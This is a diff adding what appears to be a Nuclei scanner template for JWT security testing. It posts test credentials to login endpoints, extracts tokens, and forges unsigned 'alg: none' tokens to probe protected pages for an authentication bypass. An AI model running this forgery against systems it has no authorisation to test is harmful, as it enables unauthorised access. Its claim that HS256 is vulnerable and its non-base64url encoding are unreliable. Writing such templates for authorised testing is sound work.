@@ -1,0 +1,146 @@
+id: flow-adaptive-jwt-security
+
+info:
+  name: Adaptive JWT Security Assessment Flow
+  author: geeknik
+  severity: medium
+  description: |
+    Comprehensive JWT security analysis using Flow Protocol for dynamic token discovery,
+    algorithm identification, and vulnerability assessment. This template performs
+    progressive JWT analysis including token extraction, algorithm detection, and
+    security validation while maintaining defensive research principles.
+  reference:
+    - https://tools.ietf.org/html/rfc7519
+    - https://owasp.org/www-project-web-security-testing-guide/
+  tags: jwt,flow,security-assessment,authentication,defensive
+
+flow: |
+  // Initialize JWT discovery endpoints
+  template["jwt_endpoints"] = [
+    "/api/auth/login",
+    "/oauth/token",
+    "/auth/jwt",
+    "/api/token",
+    "/login"
+  ];
+
+  // Test login endpoints for JWT token discovery
+  http("login-discovery");
+
+  // Extract and analyze JWT tokens from responses
+  let tokens = [];
+  if (template["login_response"]) {
+    const jwtRegex = /eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*/g;
+    const bodyTokens = template["login_response"].match(jwtRegex) || [];
+    tokens = tokens.concat(bodyTokens);
+  }
+  template["jwt_tokens"] = tokens;
+
+  // Analyze each discovered JWT token
+  for (let token of iterate(template["jwt_tokens"])) {
+    set("current_token", token);
+
+    // Decode JWT header to identify algorithm
+    if (token) {
+      try {
+        const parts = token.split('.');
+        if (parts.length === 3) {
+          const header = JSON.parse(atob(parts[0]));
+          template["jwt_algorithm"] = header.alg;
+          template["jwt_typ"] = header.typ;
+
+          // Check for vulnerable algorithms
+          const vulnerableAlgs = ["none", "HS256"];
+          template["vulnerable_alg"] = vulnerableAlgs.indexOf(header.alg) !== -1;
+
+          // Test token validation
+          http("token-validation");
+
+          // Test algorithm manipulation if vulnerable
+          if (template["vulnerable_alg"]) {
+            // Create manipulated token for security testing
+            const manipulatedHeader = JSON.stringify(Object.assign(header, {"alg": "none"}));
+            const encodedHeader = btoa(manipulatedHeader);
+            set("manipulated_token", encodedHeader + "." + parts[1] + ".");
+
+            http("algorithm-manipulation");
+          }
+        }
+      } catch (e) {
+        template["jwt_algorithm"] = "unknown";
+      }
+    }
+  }
+
+http:
+  - id: login-discovery
+    method: POST
+    path:
+      - "{{BaseURL}}/api/auth/login"
+      - "{{BaseURL}}/oauth/token"
+      - "{{BaseURL}}/auth/jwt"
+      - "{{BaseURL}}/api/token"
+      - "{{BaseURL}}/login"
+
+    body: |
+      username=test&password=test
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 400
+          - 401
+        internal: true
+
+    extractors:
+      - type: regex
+        name: login_response
+        internal: true
+        regex:
+          - "(?s).*"
+
+  - id: token-validation
+    method: GET
+    path:
+      - "{{BaseURL}}/api/user/profile"
+      - "{{BaseURL}}/dashboard"
+      - "{{BaseURL}}/api/protected"
+
+    headers:
+      Authorization: "Bearer {{current_token}}"
+
+    matchers:
+      - type: status
+        status:
+          - 200
+        internal: true
+
+    extractors:
+      - type: regex
+        name: token_validation_status
+        internal: true
+        regex:
+          - "HTTP/\\d\\.\\d\\s+(\\d+)"
+
+
+  - id: algorithm-manipulation
+    method: GET
+    path:
+      - "{{BaseURL}}/api/user/profile"
+      - "{{BaseURL}}/dashboard"
+
+    headers:
+      Authorization: "Bearer {{manipulated_token}}"
+
+    matchers:
+      - type: status
+        status:
+          - 200
+        name: algorithm_bypass_successful
+
+# Flow template - matchers and extractors handled by Flow logic
